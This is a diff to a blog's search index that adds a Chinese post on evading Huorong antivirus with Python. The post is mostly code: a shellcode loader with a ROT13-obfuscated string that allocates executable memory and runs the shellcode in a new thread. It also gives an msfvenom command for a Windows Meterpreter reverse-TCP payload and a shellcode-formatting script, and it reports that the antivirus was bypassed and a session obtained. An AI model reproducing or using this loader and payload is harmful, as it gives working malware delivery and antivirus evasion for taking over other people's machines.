@@ -1,6 +1,36 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>python免杀火绒</title>
+    <url>/2023/04/12/python%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/</url>
+    <content><![CDATA[<p>sd</p>
+<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import ctypes</span><br><span class="line">import base64</span><br><span class="line"># 定义 ROT13 函数，用于加密/解密</span><br><span class="line">def rot13(message):</span><br><span class="line">    res = &#x27;&#x27;</span><br><span class="line">    for item in message:</span><br><span class="line">        if (ord(item)&gt;= ord(&#x27;A&#x27;) and ord(item)&lt;= ord(&#x27;M&#x27;)) or (ord(item)&gt;= ord(&#x27;a&#x27;) and ord(item)&lt;= ord(&#x27;m&#x27;)):</span><br><span class="line">            res += chr(ord(item)+13)</span><br><span class="line">        elif (ord(item)&gt;= ord(&#x27;N&#x27;) and ord(item)&lt;= ord(&#x27;Z&#x27;)) or (ord(item)&gt;= ord(&#x27;n&#x27;) and ord(item)&lt;= ord(&#x27;z&#x27;)):</span><br><span class="line">            res += chr(ord(item)-13)</span><br><span class="line">        else:</span><br><span class="line">            res += item</span><br><span class="line">    return res</span><br><span class="line"># 定义 shellcode，这是一个二进制可执行代码，填入shellcode</span><br><span class="line">shellcode=&#x27;&#x27;</span><br><span class="line"># 解析十六进制shellcode并转换为字节对象</span><br><span class="line"></span><br><span class="line">shellcode = bytes.fromhex(shellcode)</span><br><span class="line"></span><br><span class="line"># 定义 ROT13 加密的加载器字符串</span><br><span class="line">loader = &quot;pglcrf.jvaqyy.xreary32.IveghnyNyybp.erfglcr=pglcrf.p_hvag64;ejkcntr = pglcrf.jvaqyy.xreary32.IveghnyNyybp(0, yra(furyypbqr), 0k1000, 0k40);pglcrf.jvaqyy.xreary32.EgyZbirZrzbel(pglcrf.p_hvag64(ejkcntr), pglcrf.perngr_fgevat_ohssre(furyypbqr), yra(furyypbqr));unaqyr = pglcrf.jvaqyy.xreary32.PerngrGuernq(0, 0, pglcrf.p_hvag64(ejkcntr), 0, 0, 0);pglcrf.jvaqyy.xreary32.JnvgSbeFvatyrBowrpg(unaqyr, -1)&quot;</span><br><span class="line">exec (rot13(loader))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>先用msf生成shellcode</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.18.229.138 LPORT=4399 -f c</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/04/12/python%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20230412145238858.png" alt="image-20230412145238858"></p>
+<p>然后对shellcode进行处理</p>
+<p><img src="/2023/04/12/python%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20230412152420499.png" alt="image-20230412152420499"></p>
+<p>用转换.py</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in open(&#x27;shellcode_RAW.txt&#x27;):</span><br><span class="line">    i = i.replace(&#x27;\n&#x27;,&#x27;&#x27;)</span><br><span class="line">    i = i.replace(&#x27;\\x&#x27;,&#x27;&#x27;)</span><br><span class="line">    i = i.replace(&#x27;&quot;&#x27;,&#x27;&#x27;)</span><br><span class="line">    i = i.replace(&#x27;;&#x27;,&#x27;&#x27;)</span><br><span class="line">    with open(r&#x27;shellcode.txt&#x27;,&#x27;a+&#x27;) as f:</span><br><span class="line">        f.write(i)</span><br></pre></td></tr></table></figure>
+
+<p>过火绒<img src="/2023/04/12/python%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20230412152823295.png" alt="image-20230412152823295"></p>
+<p>启动</p>
+<p><img src="/2023/04/12/python%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20230412155717923.png" alt="image-20230412155717923"></p>
+<p>打开监听</p>
+<p><img src="/2023/04/12/python%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20230412155822903.png" alt="image-20230412155822903"></p>
+<p>成功</p>
+<p><img src="/2023/04/12/python%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20230412155910803.png" alt="image-20230412155910803"></p>
+]]></content>
+      <categories>
+        <category>实验</category>
+      </categories>
+      <tags>
+        <tag>免杀</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>oracle_padding原理学习</title>
     <url>/2023/04/11/oracle_padding%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<p>挖个坑先，以后再填（大概）</p>
